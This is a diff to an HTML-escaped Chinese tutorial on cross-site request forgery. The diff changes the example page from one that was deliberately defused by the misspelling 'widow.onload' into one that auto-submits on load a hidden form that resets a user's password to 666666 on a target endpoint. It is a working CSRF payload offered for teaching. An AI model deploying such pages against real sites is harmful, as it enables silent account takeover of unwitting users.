@@ -101,22 +101,15 @@ http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接
 
 &lt;p&gt;此时我们就可以构造自动提交表单的xxxx.html，内容如下：&lt;/p&gt;
 
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
-    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
-    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
+    &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt;
 &amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
+&amp;lt;body onLoad=&amp;quot;document.forms[0].submit()&amp;quot;&amp;gt;
     &amp;lt;form action=&amp;quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&amp;quot; method=&amp;quot;post&amp;quot; name=&amp;quot;test&amp;quot;&amp;gt;
            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; value=&amp;quot;666666&amp;quot;&amp;gt;
            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;cpassword&amp;quot; id=&amp;quot;conpassword&amp;quot; value=&amp;quot;666666&amp;quot;&amp;gt;
     &amp;lt;/form&amp;gt;
-    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
-        widow.onload= function(){ //这里的window故意少了一个n，不然就自动提交了
-            document.test.submit();
-        }
-    &amp;lt;/script&amp;gt;
 &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
